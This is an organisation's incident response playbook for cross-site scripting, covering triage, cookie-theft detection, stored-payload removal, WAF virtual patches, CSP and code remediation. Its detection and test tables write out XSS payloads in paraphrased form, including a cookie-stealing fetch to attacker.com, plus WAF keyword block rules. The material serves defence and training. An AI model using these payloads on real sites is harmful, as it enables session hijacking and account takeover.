# Playbook: Web Application Attack – Cross-Site Scripting (XSS) Specific Procedures

---

## 1. Document Control

| Field          | Value                                                        |
| -------------- | ------------------------------------------------------------ |
| Document Name  | Playbook – Web Application Attack (Cross-Site Scripting Specific) |
| Document ID    | IR-PB-WEB-008                                                |
| Version        | 1.0                                                          |
| Effective Date | 19-May-2026                                                  |
| Owner          | L2/L3 Lead / IR Team Lead / Application Security Lead        |
| Approved By    | CISO                                                         |
| Classification | Internal – Confidential                                      |
| Review Cycle   | Quarterly and after any P1/P2 XSS incident                   |

---

## 2. Purpose

This document provides **Cross-Site Scripting (XSS) specific investigation, containment, and eradication procedures** for incidents where XSS exploitation is suspected or confirmed. XSS is a critical web application vulnerability because it can lead to: session hijacking (cookie theft via JavaScript), account takeover (steal tokens, credentials, session data), privilege escalation (admin session theft), malware delivery (via injected scripts), phishing attacks (inject fake login forms on legitimate sites), data exfiltration (steal form data, clipboard content, keylogging), client-side defacement (manipulate page content), propagation attacks (self-replicating XSS worms in social platforms), and regulatory breach obligations (if user data is compromised). This playbook must be used in conjunction with the core Web Application Attack playbooks, not as a standalone procedure.

---

## 3. Scope

### 3.1 In Scope

Applies to XSS attacks against: web applications (customer-facing, internal, admin panels), single page applications (SPAs) using React, Angular, Vue.js, content management systems (WordPress, Drupal, Joomla, custom CMS), web-based email clients and messaging platforms, social media platforms and user-generated content sites, e-commerce platforms (product reviews, comments), SaaS applications, mobile app webviews, and APIs returning HTML/XML content. XSS attack types covered: reflected XSS (non-persistent, payload in URL/request, immediately reflected in response), stored XSS (persistent, payload stored in database, executed when page loads for other users), DOM-based XSS (payload executes via client-side JavaScript manipulation of DOM), self-XSS (social engineering variant, victim pastes malicious script themselves), mutation XSS or mXSS (payload transforms during HTML parsing/sanitization), and universal XSS or UXSS (browser/extension vulnerability enabling cross-origin XSS).

### 3.2 Out of Scope (Use Other Playbooks)

| Scenario                                      | Use Playbook                     |
| --------------------------------------------- | -------------------------------- |
| SQL Injection                                 | PB-WebApp-SQLi-Specific.md       |
| CSRF (Cross-Site Request Forgery)             | General Web App playbook         |
| Clickjacking                                  | General Web App playbook         |
| Account takeover via credential stuffing      | 02.7_Credential-Attack/          |
| Data breach confirmed (post-XSS)              | 02.6_Data-Breach-Exfiltration/   |
| Malware delivered via XSS leading to endpoint compromise | 02.3_Malware-Trojan/   |

---

## 4. Definitions (XSS-Specific)

| Term                  | Definition                                                   |
| --------------------- | ------------------------------------------------------------ |
| XSS                   | Cross-Site Scripting – injection of malicious scripts into web pages viewed by other users |
| Reflected XSS         | Payload delivered via URL/request and immediately reflected in response (non-persistent) |
| Stored XSS            | Payload stored in database/backend and executed every time page loads (persistent) |
| DOM-based XSS         | Payload executes via client-side JavaScript DOM manipulation without server-side reflection |
| XSS Payload           | Malicious JavaScript code injected into web application      |
| Cookie Theft          | Extraction of session cookies via document.cookie to attacker-controlled server |
| BeEF                  | Browser Exploitation Framework – post-exploitation tool for XSS |
| CSP                   | Content Security Policy – HTTP header to prevent XSS execution |
| HTML Entity Encoding  | Encoding special characters (less than, greater than, quote, apostrophe) to prevent script execution |
| Sinkhole Domain       | Attacker-controlled domain used to receive stolen cookies/data |
| XSS Filter Bypass     | Techniques to evade XSS filters (encoding, obfuscation, polyglot payloads) |

---

## 5. XSS Severity Classification (Incident-Specific)

Standard severity guidance applies, but XSS incidents have unique risk factors:

| Scenario                                                     | Default Severity |
| ------------------------------------------------------------ | ---------------- |
| Stored XSS on admin panel (admin session theft possible)    | P1               |
| Stored XSS on customer-facing page (mass session theft)     | P1               |
| Reflected XSS with successful session cookie theft confirmed | P1               |
| DOM-based XSS leading to credential theft                   | P1               |
| XSS used to deliver malware (dropper script)                | P1               |
| Reflected XSS with limited exploitability (CSP blocks execution) | P2           |
| Self-XSS requiring significant social engineering           | P3               |
| XSS blocked by browser XSS filter (no impact)               | P3 or P4         |
| XSS in non-sensitive context (no auth, no data exposure)    | P3 or P4         |

Reference: 01_INCIDENT-CLASSIFICATION/01.1_Severity-Matrix/P1-Critical-Definition.md

---

## 6. XSS Attack Surface Identification (Pre-Incident Intelligence)

### 6.1 Common Vulnerable Input Points (High-Risk)

| Input Type                | Example Locations                        | Why Vulnerable                              |
| ------------------------- | ---------------------------------------- | ------------------------------------------- |
| Search queries            | /search?q=, /products?search=            | Query parameter reflected in results page   |
| User comments/reviews     | Blog comments, product reviews           | Stored in DB, rendered for all users        |
| User profile fields       | Name, bio, location, website             | Displayed on profile pages                  |
| Error messages            | 404 pages, validation errors             | Reflect user input in error text            |
| URL parameters            | /page?redirect=, /view?id=               | Reflected in links or page content          |
| Form inputs (POST)        | Contact forms, feedback forms            | Reflected in confirmation messages          |
| File upload filenames     | Document uploads with displayed names    | Filename reflected in UI                    |
| Custom headers            | X-Forwarded-For, Referer, User-Agent     | Logged and displayed in admin panels        |
| Chat/messaging            | Real-time messaging, support chat        | Messages rendered for other users           |
| Email templates (HTML)    | Password reset, notifications            | User input embedded in HTML emails          |

### 6.2 Common Vulnerable Code Patterns

| Anti-Pattern                              | Example (Vulnerable)                                         | Risk                  |
| ----------------------------------------- | ------------------------------------------------------------ | --------------------- |
| Direct innerHTML assignment               | element.innerHTML = userInput;                               | Direct XSS execution  |
| eval() with user input                    | eval(userInput);                                             | Arbitrary code exec   |
| document.write() with user input          | document.write(userInput);                                   | Direct script injection |
| Unescaped output in templates             | div with user_input without escaping                         | Template injection XSS |
| jQuery .html() with user input            | jQuery div.html(userInput);                                  | Direct HTML injection |
| Unsafe URL construction                   | a href equals javascript with userInput                      | JavaScript execution  |
| Reflected input in meta tags              | meta property equals og:title content equals userInput       | Meta tag XSS          |
| SVG file uploads without sanitization     | User uploads SVG with embedded script tags                   | Stored XSS via file   |

---

## 7. XSS Investigation Workflow (L2/L3)

### Phase 1 – Initial XSS Confirmation (L2)

#### 7.1A Evidence Collection Checklist

| Evidence Item                     | Source                  | Priority | Notes                                        |
| --------------------------------- | ----------------------- | -------- | -------------------------------------------- |
| WAF alert details                 | WAF console / SIEM      | P0       | XSS rule triggered, payload, action          |
| Request payload (full HTTP)       | WAF / reverse proxy     | P0       | Headers, parameters, body                    |
| Response HTML/JavaScript          | WAF / web server logs   | P0       | Rendered output showing payload              |
| Browser console logs (if available)| User report / screenshot| P1       | JavaScript execution evidence                |
| Application logs                  | App logging system      | P1       | Errors, user actions, session info           |
| Database records (if stored XSS)  | Database                | P1       | Stored payload in DB field                   |
| CSP violation reports (if enabled)| CSP reporting endpoint  | P2       | Blocked script execution attempts            |
| User reports/screenshots          | Email/ticketing         | P2       | Visual proof of XSS impact                   |
| Network traffic (egress)          | Proxy / firewall        | P2       | Outbound connections to attacker domains     |

#### 7.1B Payload Analysis – XSS Type Identification

| XSS Type          | Identification Markers                                       | Evidence Location                            |
| ----------------- | ------------------------------------------------------------ | -------------------------------------------- |
| Reflected         | Payload in URL parameter or form field; appears in immediate response | Request URL + response HTML                  |
| Stored            | Payload submitted in earlier request; appears when page loads | Database records + response HTML             |
| DOM-based         | Payload in URL fragment (hash symbol), processed client-side via JavaScript | Browser DevTools, JavaScript source          |
| Self-XSS          | User must manually paste payload into browser console or input field | User report + social engineering evidence    |
| Mutation XSS      | Payload transforms during HTML parsing (browser quirks)      | Before/after HTML comparison                 |

#### 7.1C Common XSS Payload Patterns (Detection Reference)

| Payload Category      | Example Payloads                                             | Detection Markers                            |
| --------------------- | ------------------------------------------------------------ | -------------------------------------------- |
| Basic script tag      | script alert(1) script                                       | script tag in input                          |
| Event handler         | img src equals x onerror equals alert(1)                     | onerror, onload, onclick, etc.               |
| JavaScript protocol   | a href equals javascript:alert(1) Click a                    | javascript: in href/src                      |
| SVG-based             | svg onload equals alert(1)                                   | svg tag with event handlers                  |
| Cookie theft          | script fetch attacker.com with cookie document.cookie script | document.cookie + external fetch             |
| Obfuscated            | script eval(atob base64 encoded) script                      | Base64/hex encoding, eval(), atob()          |
| Polyglot              | jaVasCript mixed encoding syntax tricks                      | Mixed encoding/syntax tricks                 |
| DOM manipulation      | iframe src equals javascript parent location attacker iframe | location, window.open, document.write        |

---

### Phase 2 – Impact and Scope Assessment (L2)

#### 7.2A Determine Exploitation Success Level

| Success Level       | Evidence Required                                            | Immediate Action                     |
| ------------------- | ------------------------------------------------------------ | ------------------------------------ |
| Confirmed           | Browser executed script + evidence of data theft (cookies sent to attacker) | P1 escalation, containment immediate |
| Highly Likely       | Payload rendered in HTML + browser would execute (no CSP blocking) | P1/P2 escalation, containment        |
| Possible            | Payload delivered but CSP/XSS filter may have blocked execution | L2 investigation, monitor for bypass |
| Blocked             | Browser XSS filter blocked execution or WAF prevented delivery | P3 monitoring, tune detection        |

#### 7.2B XSS Impact Assessment Questions (Mandatory L2 Evaluation)

| Question                                                     | How to Answer                                                | If YES → Action                          |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ---------------------------------------- |
| Can attacker steal session cookies?                          | Check if HttpOnly flag is NOT set on session cookies         | Force logout all sessions; escalate to P1 |
| Can attacker access sensitive data in DOM?                   | Review page source for exposed PII/tokens in JavaScript      | Escalate to data breach assessment       |
| Can attacker perform actions on behalf of victim?            | Test if CSRF tokens are bypassable via XSS                   | Escalate; assess privilege level         |
| Is this stored XSS affecting multiple users?                 | Check if payload is in database and rendered for all users   | P1 escalation; mass impact               |
| Can attacker redirect users to malicious sites?              | Check if window.location or similar can be manipulated       | Escalate; phishing/malware risk          |
| Can attacker access admin functionality?                     | Check if XSS is in admin panel or affects admin users        | P1 escalation; privilege escalation      |
| Can attacker inject keylogger or other persistent script?    | Check if stored XSS with extensive JavaScript capabilities   | P1 escalation; persistent compromise     |

#### 7.2C User Scope Estimation (Critical for Stored XSS)

For stored XSS, estimate impact scope:

| Scope Factor              | Estimation Method                                            |
| ------------------------- | ------------------------------------------------------------ |
| Number of affected users  | Count users who viewed page containing payload since injection |
| User privilege levels     | Identify if admins/employees vs public users affected        |
| Geographic distribution   | Check session logs for user locations                        |
| Time window               | First payload storage time to containment time               |
| Session status            | How many sessions may have been compromised                  |

Provide estimate in incident documentation: approximate number of users exposed, privilege levels affected (admin/employee/customer), time window of exposure, evidence of actual exploitation (cookies exfiltrated, actions performed)

---

### Phase 3 – Cookie and Session Theft Analysis (L2/L3)

Cookie theft is the most common and highest-impact XSS exploitation technique.

#### 7.3A Cookie Theft Detection Methods

| Detection Source           | What to Look For                                             | Confidence Level |
| -------------------------- | ------------------------------------------------------------ | ---------------- |
| Proxy/firewall logs        | Outbound requests to unusual domains with c= or cookie= parameters | High             |
| WAF logs                   | Requests containing document.cookie in payloads              | Medium           |
| Browser console logs       | fetch() or XMLHttpRequest calls to external domains          | High (if available) |
| CSP violation reports      | Violation of connect-src directive (blocked external fetch)  | Medium (attempt) |
| User session anomalies     | Same session cookie used from different IP/geolocation simultaneously | High             |
| Application logs           | Unusual user actions immediately after XSS timestamp         | Medium           |

#### 7.3B Cookie Theft Investigation Checklist

| Step | Action                                                       | Output                          |
| ---- | ------------------------------------------------------------ | ------------------------------- |
| 1    | Identify attacker sinkhole domain (from payload or logs)     | Attacker infrastructure list    |
| 2    | Check proxy/firewall logs for outbound connections to sinkhole | Evidence of exfiltration        |
| 3    | Identify affected user sessions (who viewed XSS page)        | List of potentially compromised sessions |
| 4    | Check for simultaneous session usage from different IPs      | Confirmed session hijacking     |
| 5    | Review session activity logs for unauthorized actions        | Impact assessment               |
| 6    | Validate if session cookies have HttpOnly flag (prevents JS access) | Vulnerability severity |

#### 7.3C HttpOnly and Secure Cookie Configuration Check

| Cookie Flag    | Purpose                                  | XSS Impact if Missing                        |
| -------------- | ---------------------------------------- | -------------------------------------------- |
| HttpOnly       | Prevents JavaScript access to cookie     | XSS can steal cookie via document.cookie     |
| Secure         | Cookie only sent over HTTPS              | Cookie can be intercepted in transit         |
| SameSite       | Restricts cookie sending in cross-site contexts | CSRF protection; less relevant to XSS    |

Validation command (browser DevTools): document.cookie; If returns session cookie, HttpOnly is NOT set (vulnerable). Remediation (if missing): immediately set HttpOnly flag on session cookies, consider setting Secure and SameSite equals Strict as well

---

### Phase 4 – Stored vs Reflected XSS Differentiation (L2)

This determines containment complexity and user impact scope.

#### 7.4A Stored XSS Investigation (High Priority)

If stored XSS is suspected:

| Step | Action                                                       | Output                          |
| ---- | ------------------------------------------------------------ | ------------------------------- |
| 1    | Identify storage location (database table/field, file, cache)| Data source                     |
| 2    | Query database for payload presence                          | Confirm storage + affected records |
| 3    | Identify all pages/components that render this data          | Full impact scope               |
| 4    | Estimate number of users who viewed affected pages           | User impact count               |
| 5    | Check if payload is still present (containment validation)   | Persistence status              |

Database Query Example (Pseudo-SQL): SELECT id, username, comment, created_at FROM user_comments WHERE comment LIKE percent script percent OR comment LIKE percent onerror percent OR comment LIKE percent javascript: percent ORDER BY created_at DESC;

#### 7.4B Reflected XSS Investigation

If reflected XSS:

| Step | Action                                                       | Output                          |
| ---- | ------------------------------------------------------------ | ------------------------------- |
| 1    | Identify vulnerable parameter/endpoint                       | Attack vector                   |
| 2    | Check WAF/web logs for exploitation attempts                 | Attack timeline                 |
| 3    | Estimate if users clicked malicious links (phishing campaign)| Distribution scope              |
| 4    | Check email/messaging logs for links containing payload      | Delivery method                 |
| 5    | Validate if payload still works (test in safe environment)   | Vulnerability status            |

---

### Phase 5 – DOM-Based XSS Deep Dive (L3)

DOM-based XSS is harder to detect because it may not appear in server logs.

#### 7.5A DOM XSS Detection Techniques

| Detection Method                  | How to Execute                                               | Evidence Output                 |
| --------------------------------- | ------------------------------------------------------------ | ------------------------------- |
| Browser DevTools inspection       | Open DevTools right arrow Sources right arrow examine JavaScript execution flow | Script execution path           |
| Client-side logging               | Review browser console for errors or execution traces        | JavaScript errors/warnings      |
| Source code review                | Review JavaScript for DOM sinks (innerHTML, eval, etc.)      | Vulnerable code locations       |
| Dynamic analysis (safe env)       | Load page with payload in safe browser environment and observe | Execution confirmation          |
| CSP violation reports             | Check if CSP reported inline script execution                | Blocked execution evidence      |

#### 7.5B Common DOM XSS Sinks (Dangerous Functions)

| Sink Function/Property | Why Dangerous                                | Example Vulnerable Code                      |
| ---------------------- | -------------------------------------------- | -------------------------------------------- |
| innerHTML              | Directly renders HTML including scripts      | div.innerHTML = location.hash;               |
| outerHTML              | Same as innerHTML                            | div.outerHTML = userInput;                   |
| document.write()       | Writes directly to document                  | document.write(location.search);             |
| eval()                 | Executes arbitrary JavaScript                | eval(location.hash);                         |
| setTimeout()           | Can execute strings as code                  | setTimeout(userInput, 100);                  |
| setInterval()          | Same as setTimeout                           | setInterval(userInput, 1000);                |
| location.href          | Can execute javascript: URLs                 | location.href = userInput;                   |
| location.assign()      | Same as location.href                        | location.assign(userInput);                  |

#### 7.5C DOM XSS Source Identification (Where Attacker Input Comes From)

| Source                | Description                                  | Example                          |
| --------------------- | -------------------------------------------- | -------------------------------- |
| location.hash         | URL fragment (after hash symbol)             | http://site.com/hash payload     |
| location.search       | URL query string                             | http://site.com/?q=payload       |
| document.referrer     | Referrer header                              | Previous page URL                |
| window.name           | Window name property                         | Can be set by attacker           |
| postMessage()         | Cross-origin messaging                       | Attacker-controlled messages     |
| localStorage/sessionStorage | Browser storage                        | If attacker can write to storage |

---

### Phase 6 – Containment (XSS-Specific Actions)

Containment must be layered to stop exploitation while preserving evidence and minimizing disruption.

#### 7.6A Immediate Containment Actions (Priority Order)

| Priority | Action                                      | Owner          | Implementation Time | Notes                                    |
| -------- | ------------------------------------------- | -------------- | ------------------- | ---------------------------------------- |
| P0       | Block attacker sinkhole domains at proxy/firewall | Network/Security | less than 5 minutes | Prevent cookie exfiltration            |
| P0       | Remove stored payload from database (if stored XSS) | DBA/App Owner | less than 15 minutes | Stop affecting additional users       |
| P1       | Deploy WAF rule to block XSS patterns on vulnerable endpoint | AppSec/WAF | less than 15 minutes | Virtual patching                      |
| P1       | Invalidate all active sessions (if cookie theft confirmed) | IAM/App Owner | less than 30 minutes | Prevent session hijacking             |
| P1       | Set HttpOnly flag on session cookies (if missing) | App Owner | less than 1 hour | Prevent future cookie theft via XSS      |
| P2       | Deploy CSP header (if not present)          | App Owner      | less than 2 hours   | Defense-in-depth                         |
| P2       | Disable vulnerable feature (if feasible)    | App Owner      | less than 1 hour    | Requires business approval               |
| P3       | Force password reset for affected high-privilege users | IAM/Security | less than 24 hours | If admin session theft suspected      |

#### 7.6B Stored XSS Payload Removal Procedure

Critical: Export evidence BEFORE deletion.

| Step | Action                                                       | Owner        | Notes                                |
| ---- | ------------------------------------------------------------ | ------------ | ------------------------------------ |
| 1    | Export database records containing payload (CSV/JSON)        | DBA          | Evidence preservation (hash export)  |
| 2    | Take database snapshot (if feasible without service impact)  | DBA          | Rollback capability                  |
| 3    | Delete or sanitize malicious records                         | DBA/App Owner| Use UPDATE to sanitize, not DELETE (audit trail) |
| 4    | Clear application cache (if cached rendering exists)         | App Owner    | Ensure payload not served from cache |
| 5    | Verify payload no longer appears in rendered pages           | L2/QA        | Validation testing                   |
| 6    | Monitor for re-injection attempts                            | SOC          | Continuous monitoring                |

Example sanitization query (PostgreSQL): UPDATE user_comments SET comment = regexp_replace(comment, script any characters script, empty string, gi) WHERE comment LIKE percent script percent;

#### 7.6C WAF Virtual Patch Examples (XSS)

| XSS Attack Vector      | Example WAF Rule Pattern (Regex/Logic)                       | Notes                                |
| ---------------------- | ------------------------------------------------------------ | ------------------------------------ |
| Script tag injection   | Block if request contains script any characters              | Case-insensitive, watch for encoding |
| Event handler injection| Block on followed by word characters equals                  | May have false positives; tune       |
| JavaScript protocol    | Block javascript: in parameters                              | High confidence                      |
| SVG-based XSS          | Block svg any characters on word characters                  | SVG with event handlers              |
| Common keywords        | Block script, onerror, onload, eval(, alert(, document.cookie | Combination rule                    |
| Encoded payloads       | Decode URL encoding before matching (WAF built-in)           | Prevents encoding bypass             |

Important: Test in monitoring mode first if business allows, to avoid false positives.

#### 7.6D Content Security Policy (CSP) Deployment (Defense-in-Depth)

CSP is a powerful mitigation but requires careful configuration. Recommended CSP Header (Strict): Content-Security-Policy: default-src self; script-src self nonce-random; object-src none; base-uri self; frame-ancestors none; form-action self; upgrade-insecure-requests; report-uri /csp-violation-report

Key Directives:

| Directive         | Purpose                                  | XSS Protection                           |
| ----------------- | ---------------------------------------- | ---------------------------------------- |
| script-src        | Restricts script sources                 | Blocks inline scripts and untrusted sources |
| object-src        | Restricts plugin content (Flash, etc.)   | Prevents plugin-based XSS                |
| base-uri          | Restricts base tag                       | Prevents base tag hijacking              |
| frame-ancestors   | Prevents embedding in iframes            | Clickjacking protection                  |
| report-uri        | Sends violation reports                  | Detection and monitoring                 |

Deployment Steps: 1. Deploy in report-only mode first: Content-Security-Policy-Report-Only, 2. Monitor violation reports for 1-2 weeks, 3. Tune policy to allow legitimate scripts (use nonces or hashes), 4. Switch to enforcement mode: Content-Security-Policy

---

### Phase 7 – Eradication and Remediation (Post-Containment)

#### 7.7A Code Remediation (Permanent Fix)

| Remediation Type                  | Implementation Example (JavaScript/Pseudo)                   | Timeline      |
| --------------------------------- | ------------------------------------------------------------ | ------------- |
| Output encoding/escaping          | element.textContent = userInput; (instead of innerHTML)      | Immediate     |
| Use safe DOM APIs                 | document.createTextNode(userInput) instead of innerHTML      | Immediate     |
| Template auto-escaping            | Use framework escaping (React, Angular, Vue auto-escape by default) | Immediate     |
| Sanitization library              | Use DOMPurify: element.innerHTML = DOMPurify.sanitize(userInput); | Medium-term   |
| Input validation (whitelist)      | Validate input against allowed character set/format          | Immediate     |
| CSP deployment                    | Add CSP header to all responses                              | Short-term    |
| HttpOnly cookies                  | Set HttpOnly flag on session cookies                         | Immediate     |
| Remove dangerous sinks            | Replace eval(), innerHTML, document.write() with safe alternatives | Medium-term |

#### 7.7B Framework-Specific Remediation Guidance

| Framework/Library | Safe Practice                                                | Dangerous Practice (Avoid)               |
| ----------------- | ------------------------------------------------------------ | ---------------------------------------- |
| React             | Use JSX (auto-escapes by default); userInput                 | dangerouslySetInnerHTML html userInput   |
| Angular           | Use data binding userInput (auto-escaped)                    | innerHTML equals userInput without sanitization |
| Vue.js            | Use userInput (auto-escaped)                                 | v-html equals userInput without sanitization |
| jQuery            | Use .text(userInput) instead of .html(userInput)             | .html(userInput)                         |
| Vanilla JS        | Use textContent or createTextNode()                          | innerHTML, outerHTML, eval()             |

#### 7.7C Validation Testing (Before Declaring Eradication Complete)

| Test                                  | Method                                                       | Expected Result                  |
| ------------------------------------- | ------------------------------------------------------------ | -------------------------------- |
| XSS payload attempt (safe test env)   | Submit known XSS payloads to patched endpoint in staging     | All blocked by WAF or safely rendered (encoded) |
| Penetration test (authorized)         | Engage AppSec or authorized pentester                        | No XSS vulnerabilities found     |
| Code review                           | Manual review + static analysis tool (SAST)                  | No unsafe DOM manipulation       |
| WAF rule effectiveness                | Test with OWASP XSS payload list                             | All blocked or safely handled    |
| CSP validation                        | Test inline scripts (should be blocked)                      | CSP blocks execution             |
| HttpOnly cookie verification          | Check DevTools: document.cookie should NOT return session cookie | Cookie not accessible via JS   |

---

### Phase 8 – Evidence Preservation and Chain of Custody (Legal Readiness)

XSS incidents leading to account takeover or data breach require legally defensible evidence.

#### 7.8A Evidence Preservation Checklist (P1/P2 Incidents)

| Evidence Item                  | Format                  | Hash Algorithm | Storage Location      | Retention Period |
| ------------------------------ | ----------------------- | -------------- | --------------------- | ---------------- |
| WAF logs (full export)         | JSON / CSV              | SHA-256        | Evidence vault        | 7 years (legal)  |
| Web server access logs         | Raw log files           | SHA-256        | Evidence vault        | 7 years          |
| Application logs               | JSON / structured       | SHA-256        | Evidence vault        | 7 years          |
| Database records (with payload)| SQL export / JSON       | SHA-256        | Evidence vault        | 7 years          |
| Request/response samples       | PCAP or HTTP archive    | SHA-256        | Evidence vault        | 7 years          |
| Browser screenshots            | PNG                     | SHA-256        | Evidence vault        | 7 years          |
| CSP violation reports          | JSON                    | SHA-256        | Evidence vault        | 7 years          |
| Session logs (hijacking evidence)| JSON / CSV            | SHA-256        | Evidence vault        | 7 years          |
| Proxy/firewall logs (cookie exfil)| Syslog / JSON        | SHA-256        | Evidence vault        | 7 years          |

Reference: 06_EVIDENCE-AND-CHAIN-OF-CUSTODY/06.1_Evidence-Collection/Evidence-Collection-SOP.md

---

### Phase 9 – Post-Incident Activities (Mandatory)

#### 7.9A Lessons Learned Session (Required for P1/P2)

Schedule within 5 business days of incident closure. Attendees: SOC Lead, L2/L3 analysts involved, Application Owner, AppSec Lead, Development Team Lead, CISO (for P1). Agenda items:

| Topic                             | Questions to Answer                                          |
| --------------------------------- | ------------------------------------------------------------ |
| Detection effectiveness           | How quickly was XSS detected? Were there missed signals?     |
| Containment speed                 | How long to remove payload and invalidate sessions?          |
| Root cause                        | Why did the vulnerability exist? Code review gap? Framework misuse? |
| User impact                       | How many users affected? Any confirmed cookie theft?         |
| CSP/HttpOnly status               | Were these protections in place? If not, why?                |
| Communication effectiveness       | Were stakeholders notified timely? Any gaps?                 |
| Tooling gaps                      | Do we need better XSS detection? WAF tuning?                 |
| Process improvements              | What should we change in our playbooks?                      |

Reference: 08_POST-INCIDENT/08.1_Lessons-Learned/Lessons-Learned-Template.md

#### 7.9B Detection Engineering Improvements (Required Output)

Add to Detection Improvement Log:

| Improvement                                                  | Owner      | Target Date | Status |
| ------------------------------------------------------------ | ---------- | ----------- | ------ |
| Create SIEM correlation for outbound traffic to sinkhole domains | L3/Detection | +30 days  | Open   |
| Tune WAF to detect XSS payload variations observed in incident | AppSec   | +7 days     | Open   |
| Deploy CSP on all customer-facing applications               | AppSec/Dev | +60 days    | Open   |
| Enable CSP reporting endpoint and monitoring                 | AppSec     | +30 days    | Open   |
| Add alert for simultaneous session usage from different IPs  | L3/Detection | +30 days  | Open   |
| Implement automated XSS scanning in CI/CD pipeline           | DevSecOps  | +60 days    | Open   |
| Enforce HttpOnly flag on all session cookies                 | Dev Team   | +14 days    | Open   |

Reference: 08_POST-INCIDENT/08.3_Improvement-Tracking/Detection-Improvement-Log.md

---

## 8. XSS-Specific MITRE ATT&CK Mapping (Quick Reference)

| MITRE Technique | Technique Name                    | How It Applies to XSS                        |
| --------------- | --------------------------------- | -------------------------------------------- |
| T1190           | Exploit Public-Facing Application | Initial XSS exploitation                     |
| T1203           | Exploitation for Client Execution | XSS payload executes in victim browser       |
| T1539           | Steal Web Session Cookie          | Cookie theft via document.cookie             |
| T1528           | Steal Application Access Token    | Token theft via XSS (OAuth, JWT)             |
| T1566.002       | Phishing: Spearphishing Link      | Reflected XSS delivered via phishing         |
| T1078           | Valid Accounts                    | Account takeover via stolen session          |
| T1534           | Internal Spearphishing            | Stored XSS targeting internal users          |
| T1189           | Drive-by Compromise               | XSS leading to malware delivery              |

Full mapping available in: 02_PLAYBOOKS/02.8_Web-Application-Attack/PB-WebApp-MITRE-Mapping.md

---

## 9. Common XSS Mistakes to Avoid (Analyst Guidance)

| Mistake                                           | Risk                                | Correct Approach                             |
| ------------------------------------------------- | ----------------------------------- | -------------------------------------------- |
| Assuming browser XSS filter is sufficient         | Modern browsers deprecated XSS filters | Rely on CSP + output encoding               |
| Deleting stored payload without exporting evidence| Evidence loss                       | Export before deletion                       |
| Not invalidating sessions after cookie theft     | Attacker retains access             | Force logout all potentially affected sessions |
| Testing XSS payloads on production                | May worsen impact / legal risk      | Use staging environment only                 |
| Not checking for DOM-based XSS                    | Missed client-side vulnerability    | Always review JavaScript sources             |
| Closing incident before HttpOnly flag is set      | Vulnerability persists              | Validate cookie configuration before closure |
| Not coordinating with IAM team                    | Incomplete response                 | IAM must be involved for session management  |

---

## 10. MSSP Client Handling Notes (XSS Context)

For MSSP-managed environments: Client approval required for: invalidating all user sessions (high business impact), disabling application features, forcing password resets, CSP deployment (may break application functionality). Client notification required for: P1/P2 XSS incidents (immediate), any suspected cookie/session theft (immediate), stored XSS affecting customer-facing pages (immediate), containment actions that may impact user experience. Evidence segregation: store client evidence in client-specific vault, do not share client vulnerabilities or payloads with other clients, maintain separate Chain of Custody per client. Reference: 09_MSSP-SPECIFIC/09.1_Client-Management/Client-Environment-Profile-Template.md

---

## 11. Regulatory and Compliance Context (XSS)

XSS incidents can trigger regulatory obligations if they lead to data breach:

| Regulation   | Trigger Condition                           | Notification Timeline      | Required Evidence                     |
| ------------ | ------------------------------------------- | -------------------------- | ------------------------------------- |
| GDPR         | Personal data accessed via session hijacking| 72 hours to regulator      | Incident timeline, data scope, IOCs   |
| PCI-DSS      | Cardholder data accessed via XSS            | Immediate to payment brands| Forensic report, remediation plan     |
| RBI          | Customer data breach in financial sector    | As per RBI circular        | Incident report, root cause, actions  |
| HIPAA        | PHI accessed via stolen session (healthcare)| 60 days (with exceptions)  | Risk assessment, breach analysis      |
| CCPA         | California resident data breach via XSS     | Without unreasonable delay | Notice to consumers                   |

Action: If XSS leads to data breach or account takeover with data access, activate: 02_PLAYBOOKS/02.6_Data-Breach-Exfiltration/PB-DataBreach-Regulatory-Reporting.md

---

## 12. Tools and Techniques Reference

### 12.1 Recommended Tools (L2/L3 Analysts)

| Tool Category           | Tool Examples                    | Purpose                                      |
| ----------------------- | -------------------------------- | -------------------------------------------- |
| XSS Detection           | Burp Suite, OWASP ZAP            | Vulnerability scanning (controlled use)      |
| Browser DevTools        | Chrome/Firefox DevTools          | DOM analysis, JavaScript debugging           |
| XSS Payload Database    | XSS Hunter, PortSwigger XSS Cheat Sheet | Payload reference and testing         |
| Sanitization Testing    | DOMPurify (library)              | Validate sanitization effectiveness          |
| WAF Management          | Vendor-specific (Cloudflare, Imperva) | Virtual patching                         |
| Static Analysis         | SonarQube, ESLint security plugins | Identify vulnerable code patterns           |
| CSP Validator           | Google CSP Evaluator             | Validate CSP header configuration            |

### 12.2 XSS Testing Payloads (For Controlled Validation Only – Non-Production)

WARNING: Only use in authorized testing environments with proper approvals.

| Payload                              | XSS Type         | Expected Result (Vulnerable System)          |
| ------------------------------------ | ---------------- | -------------------------------------------- |
| script alert(1) script               | Reflected/Stored | Alert box appears                            |
| img src equals x onerror equals alert(1) | Reflected/Stored | Alert box appears on image load error    |
| svg onload equals alert(1)           | Reflected/Stored | Alert box appears on SVG load                |
| javascript:alert(1)                  | DOM-based        | Alert when used in href/src attribute        |
| script fetch attacker.com cookie document.cookie script | Cookie theft | Cookie sent to attacker domain |

---

## 13. Related Documents

| Document                    | Path                                                         |
| --------------------------- | ------------------------------------------------------------ |
| Web App Master              | 02_PLAYBOOKS/02.8_Web-Application-Attack/PB-WebApp-Master.md |
| Web App L1 Triage           | 02_PLAYBOOKS/02.8_Web-Application-Attack/PB-WebApp-L1-Triage.md |
| Web App L2 Investigation    | 02_PLAYBOOKS/02.8_Web-Application-Attack/PB-WebApp-L2-Investigation.md |
| Web App L3 Forensics        | 02_PLAYBOOKS/02.8_Web-Application-Attack/PB-WebApp-L3-Forensics.md |
| Web App Containment         | 02_PLAYBOOKS/02.8_Web-Application-Attack/PB-WebApp-Containment.md |
| SQLi Specific               | 02_PLAYBOOKS/02.8_Web-Application-Attack/PB-WebApp-SQLi-Specific.md |
| MITRE Mapping               | 02_PLAYBOOKS/02.8_Web-Application-Attack/PB-WebApp-MITRE-Mapping.md |
| Data Breach Playbooks       | 02_PLAYBOOKS/02.6_Data-Breach-Exfiltration/                  |
| Credential Attack Playbooks | 02_PLAYBOOKS/02.7_Credential-Attack/                         |
| Evidence Handling           | 06_EVIDENCE-AND-CHAIN-OF-CUSTODY/                            |
| Lessons Learned Template    | 08_POST-INCIDENT/08.1_Lessons-Learned/Lessons-Learned-Template.md |
| Detection Improvement Log   | 08_POST-INCIDENT/08.3_Improvement-Tracking/Detection-Improvement-Log.md |

---

## 14. Revision History

| Version | Date        | Author                               | Changes         |
| ------- | ----------- | ------------------------------------ | --------------- |
